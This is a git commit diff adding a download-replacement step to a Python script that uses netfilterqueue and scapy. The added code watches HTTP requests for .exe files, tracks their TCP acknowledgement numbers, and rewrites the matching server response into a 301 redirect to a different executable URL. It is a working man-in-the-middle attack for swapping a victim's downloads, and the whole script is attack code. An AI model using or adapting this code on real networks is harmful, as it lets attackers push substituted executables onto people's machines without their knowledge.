c5d72f5d324c8d35c80d7adc229f03bf555cebcb
Sepp1324 <stoegerer.sebastian@aon.at>
2020-05-25 22:35:07 +0000

    Download-Replacer

--- replace_download/replace_download.py
+++ replace_download/replace_download.py
@@ -3,18 +3,30 @@
 import netfilterqueue
 import scapy.all as scapy
 
+ack_list = []
+
+def set_load(packet, load):
+	packet[scapy.Raw].load = load
+				
+	del packet[scapy.IP].len
+	del packet[scapy.IP].chksum
+	del packet[scapy.TCP].chksum
+	return packet
+
 def process_packet(packet):
 	scapy_packet = scapy.IP(packet.get_payload())
 
 	if scapy_packet.haslayer(scapy.Raw):
 		if scapy_packet[scapy.TCP].dport == 80:
-			print("HTTP Request: ")
 			if ".exe" in scapy_packet[scapy.Raw].load:
 				print("[+] .exe Request")
-				print(scapy_packet.show())
+				ack_list.append(scapy_packet[scapy.TCP].ack)
+				
 		elif scapy_packet[scapy.TCP].sport == 80:
-			print("HTTP Resolve: ")
-			print(scapy_packet.show())
+			if scapy_packet[scapy.TCP].seq in ack_list:
+				ack_list.remove(scapy_packet[scapy.TCP].seq)
+				print("[+] Replacing file")
+				packet.set_payload(str(set_load(scapy_packet, "HTTP/1.1 301 Moved Permanently\nLocation: https://www.rarlab.com/rar/winrar-x64-590.exe\n\n")))
 	packet.accept()
 
 
